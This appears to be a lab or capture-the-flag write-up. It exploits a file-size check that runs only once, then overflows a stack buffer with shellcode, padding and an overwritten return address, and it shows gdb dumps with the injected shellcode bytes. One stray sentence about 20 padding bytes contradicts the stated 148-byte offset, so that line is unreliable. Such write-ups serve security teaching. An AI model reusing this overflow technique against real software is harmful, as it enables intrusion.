# 05 - deneb Writeup

## Main Idea

The code is vulnerable the once the file is opened and the size of file is checked, it will not check it again. So we can use a empty file to pass the check. Then we use a bigger file to exploit the program.

## Magic Numbers

The address of buffer is `0xffffd618`, the RIP is `0xffffd6ac`, so the location of RIP is 148 bytes away from the start of the buffer (0xffffd6ac - 0xffffd618).

``` C++
(gdb) i f
Stack level 0, frame at 0xffffd6b0:
 eip = 0x8049311 in read_file (orbit.c:47); saved eip = 0x804939c
 called by frame at 0xffffd6c0
 source language c.
 Arglist at 0xffffd6a8, args:
 Locals at 0xffffd6a8, Previous frame's sp is 0xffffd6b0
 Saved registers:
  ebp at 0xffffd6a8, eip at 0xffffd6ac
(gdb) x/16x buf
0xffffd618:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffd628:     0x00000000      0x0804904a      0x00000000      0x000003ed      
0xffffd638:     0x000003ed      0x000003ed      0x000003ed      0xffffd81b      
0xffffd648:     0x178bfbff      0x00000064      0x00000000      0x00000000 
```

## Exploit Structure

Here is the stack diagram.

The exploit has three parts:

1. write SHELLCODE in buffer
2. write  148 - len(SHELLCODE) dummy characters to pad the interval.
3. write the address of the shellcode (0xffffd618) to the rip.
Write 20 dummy characters to overwrite `buf`, the compiler padding, and the sfp.

This causes the `orbit` function to start executing the shellcode at address `0xffffd618` when it returns.

## Exploit GDB Output

the stack before attack

```C++
(gdb) x/48x buf
0xffffd618:     0x00000020      0x00000008      0x00001000      0x00000000
0xffffd628:     0x00000000      0x0804904a      0x00000000      0x000003ed      
0xffffd638:     0x000003ed      0x000003ed      0x000003ed      0xffffd81b      
0xffffd648:     0x178bfbff      0x00000064      0x00000000      0x00000000      
0xffffd658:     0x00000000      0x00000000      0x00000000      0x00000001      
0xffffd668:     0x00000000      0xffffd80b      0x00000002      0x00000000      
0xffffd678:     0x00000000      0x00000000      0x00000000      0xffffdfe6      
0xffffd688:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000      
0xffffd698:     0x00000000      0x00000003      0x00000000      0x00000000      
0xffffd6a8:     0xffffd6b8      0x0804939c      0x00000001      0x08049391      
0xffffd6b8:     0xffffd73c      0x0804956a      0x00000001      0xffffd734      
0xffffd6c8:     0xffffd73c      0x080510a1      0x00000000      0x00000000 
```

the stack after attack

```c++
(gdb) x/48x buf
0xffffd618:     0xdb31c031      0xd231c931      0xb05b32eb      0xcdc93105
0xffffd628:     0xebc68980      0x3101b006      0x8980cddb      0x8303b0f3      
0xffffd638:     0x0c8d01ec      0xcd01b224      0x39db3180      0xb0e674c3      
0xffffd648:     0xb202b304      0x8380cd01      0xdfeb01c4      0xffffc9e8      
0xffffd658:     0x414552ff      0x00454d44      0x41414141      0x41414141      
0xffffd668:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd678:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd688:     0x41414141      0x41414141      0x41414141      0x41414141      
0xffffd698:     0x00000099      0x41414141      0x41414141      0x41414141      
0xffffd6a8:     0x41414141      0xffffd618      0x0000000a      0x08049391      
0xffffd6b8:     0xffffd73c      0x0804956a      0x00000001      0xffffd734      
0xffffd6c8:     0xffffd73c      0x080510a1      0x00000000      0x00000000
```
